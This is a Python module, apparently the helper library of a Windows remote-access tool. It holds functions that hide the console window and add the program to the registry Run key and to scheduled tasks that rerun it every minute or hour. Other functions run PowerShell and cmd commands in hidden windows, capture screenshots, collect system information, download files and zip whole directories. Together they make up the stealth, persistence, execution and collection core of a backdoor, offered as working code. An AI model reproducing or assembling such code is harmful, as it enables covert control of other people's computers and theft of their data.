############################################################################
#
#   © 2022 ABDULKADİR GÜNGÖR All Rights Reserved
#   Contact email address: abdulkadir_gungor@outlook.com
#
#	Developper:	Abdulkadir GÜNGÖR (abdulkadir_gungor@outlook.com)
#	Date:	04/2022
#	All Rights Reserved (Tüm Hakları Saklıdır)
#
############################################################################
import ctypes, os , zipfile, requests, subprocess, winreg, hashlib, time, pyautogui, shutil
from threading import Timer
from PIL import Image

#
def f1_console_hide():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


#
def f1_console_show():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)


#
def f2_os_getcwd():
    return os.getcwd()


#
def f2_os_setcd(path):
    try:
        os.chdir(path)
        return True
    except:
        return False


#
def f3_cd_create(path):
    try:
        os.mkdir(path)
        return True
    except:
        return False

#
def f3_cd_delete(path):
    try:
        shutil.rmtree(path)
        return True
    except:
        return False

#
def f4_list_dir(path):
    files = list()
    directory = list()
    try:
        for tmp in os.scandir(path):
            if tmp.is_file():
                files.append(tmp.name)
            elif tmp.is_dir():
                directory.append(tmp.name)
        return True ,directory, files
    except:
        return  False ,directory ,files

#
def f4_dir(path):
    res, rescd, resff = f4_list_dir(path)
    cd = f2_os_getcwd()
    if res:
        msg = "Program Working Directory = " + cd + "\n\n"
        msg += "Path = " + path + "\n"
        msg += ("-" * 50) + "\n"
        for directory in rescd:
            msg += "<dir>  " + directory + "\n"
        for file in resff:
            msg += "<file> " + file + "\n"
        return True, msg
    else:
        return False, ' '

# rename or move
def f5_rename_file_directory(old_path, new_path):
    try:
        os.rename(old_path,new_path)
        return True
    except:
        return False

#
def f5_delete_file(file):
    try:
        os.remove(file)
        return True
    except:
        return False

#
def f6_url_download(remote_url, filename):
    try:
        file = requests.get(url=remote_url)
        with open(filename, "wb") as f:
            f.write(file.content)
        return True
    except:
        return False

#

def f7_zip_extract(path_to_zip_file,directory_to_extract):
    try:
        with zipfile.ZipFile(path_to_zip_file, 'r') as zfile:
            zfile.extractall(directory_to_extract)
        return True
    except:
        return False

#
def f7_listdir(directory):
    list_files = []
    res, resdir, resfiles = f4_list_dir(path=directory)
    if res:
        for f in resfiles:
            ff = directory + '\\' + f
            list_files.append(ff)
        for d in  resdir:
            dd = directory + '\\' + d
            files = f7_listdir(dd)
            for file in files:
                list_files.append(file)
    #
    return list_files

#
def f7_zip_create_directory(zip_file, directory):
    try:
        resfiles = f7_listdir(directory=directory)
        with zipfile.ZipFile(zip_file, 'w') as zfile:
            for add_file in resfiles:
                zfile.write(add_file)
        return True
    except:
        return False

def f7_zip_create_file(zip_file, file):
    try:
        with zipfile.ZipFile(zip_file, 'w') as zfile:
            zfile.write(file)
        return True
    except:
        return False

#
def f8_start(program):
    try:
        subprocess.call(program, timeout=5)
        return True
    except:
        return False

#
def f9_persistent_regedit(reg_name, program_name, program_path):
    try:
        reg_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        reg_value = "{path}\\{name}".format(path=program_path, name=program_name)
        #
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        #
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as reg:
            winreg.SetValueEx(reg, reg_name, 0, winreg.REG_SZ, reg_value)
        #
        return  True
    except:
        return False

#
def f9_remove_regedit(reg_name):
    reg_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as reg:
            winreg.DeleteValue(reg, reg_name)
        return True
    except:
        return False

#
def f10_create_sctasks_minute(TaskName, Program, minute=1):
    code = 'SCHTASKS /CREATE /SC MINUTE /MO {min} /TN "{taskname}" /TR "{program}"'.format(min=minute, taskname=TaskName, program=Program)
    try:
        subprocess.run(code)
        return True
    except:
        return False

#
def f10_create_sctasks_hourly(TaskName, Program, hour=1):
    code = 'SCHTASKS /CREATE /SC HOURLY /MO {hr} /TN "{taskname}" /TR "{program}"'.format(hr=hour, taskname=TaskName, program=Program)
    try:
        subprocess.run(code)
        return True
    except:
        return False
#
def f10_create_sctasks_daily(TaskName, Program, time="00:00"):
    code = 'SCHTASKS /CREATE /SC DAILY /TN "{taskname}" /TR "{program}" /ST {timee}'.format(taskname=TaskName, program=Program, timee=time)
    try:
        subprocess.run(code)
        return True
    except:
        return False

#
def f10_create_sctasks_once(TaskName, Program,time="00:00"):
    code = 'SCHTASKS /CREATE /SC ONCE /TN "{taskname}" /TR "{program}" /ST {timee}'.format(taskname=TaskName, program=Program, timee=time)
    try:
        subprocess.run(code)
        return True
    except:
        return False

#
def f10_disable_schtasks(TaskName):
    code = 'SCHTASKS /CHANGE /TN "{taskname}" /DISABLE'.format(taskname=TaskName)
    try:
        subprocess.run(code)
        return True
    except:
        return False

#
def f10_delete_schtasks(TaskName):

    code = 'SCHTASKS /DELETE /TN "{taskname}" /F'.format(taskname=TaskName)
    try:
        subprocess.run(code)
        return True
    except:
        return False


def f11_run_powershell(command, encode="cp857"):
    #
    #
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= (
                subprocess.STARTF_USESTDHANDLES | subprocess.STARTF_USESHOWWINDOW
        )
        startupinfo.wShowWindow = subprocess.SW_HIDE
        #
        proc = subprocess.Popen('powershell', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                                startupinfo=startupinfo)
        cmd = command + b'\r\n'
        proc.stdin.write(cmd)
        aa = proc.communicate()
        proc.stdin.close()
        #
        dd = bytes.decode(aa[0], encoding=encode)
        z1 = dd.rfind("\r\n")
        #
        result = dd[:z1]
        return False, result.encode("UTF-8")
    except:
        return True, b''

#
def f12_run_cmd(command, encode="cp857"):
    #
    #
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= (
                subprocess.STARTF_USESTDHANDLES | subprocess.STARTF_USESHOWWINDOW
        )
        startupinfo.wShowWindow = subprocess.SW_HIDE
        #
        proc = subprocess.Popen('cmd.exe /Q', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL ,startupinfo=startupinfo)
        cmd = command + b'\r\n'
        proc.stdin.write(cmd)
        aa = proc.communicate()
        proc.stdin.close()
        #
        dd = bytes.decode(aa[0], encoding=encode)
        z1 = dd.rfind("\r\n\r\n")
        #
        result = dd[:z1]
        return False, result.encode("UTF-8")
    except:
        return True, b''
#
def f13_system_info(encode="cp857"):
    try:
        #
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= (
                subprocess.STARTF_USESTDHANDLES | subprocess.STARTF_USESHOWWINDOW
        )
        startupinfo.wShowWindow = subprocess.SW_HIDE
        #
        data = subprocess.Popen('systeminfo', stdout=subprocess.PIPE, stderr=subprocess.DEVNULL ,startupinfo=startupinfo)
        result = data.communicate()
        #
        res = result[0].decode(encode, "backslashreplace")
        #
        return False, res.encode("UTF-8")
        #
    except:
        return True, b''
#
#
def f14_check_file(filename):
    BUFFER_SIZE = 1024 * 10
    #
    try:
        with open( filename, "rb" ) as cfile:
            size = cfile.seek(0, 2)
            cfile.seek(0, 0)
            hash_md5 = hashlib.md5()
            hash_sha128 = hashlib.sha1()
            hash_sha256 = hashlib.sha256()
            hash_sha512 = hashlib.sha512()
            #
            while True:
                tmp_data = cfile.read(BUFFER_SIZE)
                if tmp_data == b'':
                    break
                hash_md5.update(tmp_data)
                hash_sha128.update(tmp_data)
                hash_sha256.update(tmp_data)
                hash_sha512.update(tmp_data)
            #
            res1 = hash_md5.hexdigest()
            res2 = hash_sha128.hexdigest()
            res3 = hash_sha256.hexdigest()
            res4 = hash_sha512.hexdigest()
        #
        #return notError, filename, size, md5 , sha1, sha258, sha512
        return True, filename, size, res1, res2 , res3, res4
    except:
        return False,  filename,  0,   "" ,   "" ,  "" ,  ""

#
def f14_file_write(filename, data):
    #
    try:
        with open( filename, "ab" ) as wfile:
            wfile.write(data)
        return True
    except:
        return False

#
def f14_file_read(filename, offset=0):
    BUFFER_SIZE = 1024 * 10
    #
    try:
        with open( filename, "rb" ) as rfile:
            rfile.seek(offset,0)
            tmp_data = rfile.read(BUFFER_SIZE)
            offset = rfile.tell()
            if tmp_data == b'':
                return False, 0 ,b''
        return True, offset , tmp_data
    except:
        return False, 0 ,b''


#
def f15_time_str():
    try:
        timestr = time.strftime("%Y-%m-%d_%H-%M-%S")
        return True, timestr
    except:
        return False, ""

#
def f15_time_byte():
    try:
        timestr = time.strftime("%Y-%m-%d_%H-%M-%S")
        timebyte = timestr.encode(encoding="utf-8")
        return True, timebyte
    except:
        return False, b''

#
def f16_screenshot_to_bytes():
    try:
        data = (pyautogui.screenshot()).tobytes()
        return True, data
    except:
        return False, b''

#
def f16_screenshot_save(data, imagename):
    try:
        image = Image.frombytes('RGB', (1920, 1080), data)
        image.save(imagename)
        return True
    except:
        return False

#
def f16_screenshot_show(data):
    try:
        image = Image.frombytes('RGB', (1920, 1080), data)
        image.show()
        return True
    except:
        return False

#
def f17_timer_once(second, func, arg=None ):
    if arg is not None:
        #Timer(second, func, ["",""])
        Timer(second,func, arg).start()
    else:
        #Timer(second, func, ["",""])
        Timer(second, func).start()

#
# rt = RepeatTimer(second, func, ['arg1','arg2' ...])
# rt.start()
# ...
# rt.cancel()
#
class f18_RepeatTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


#
def f18_repeatProgram(second, program):
    arg = [program]
    rt = f18_RepeatTimer(second, f8_start, arg)
    rt.start()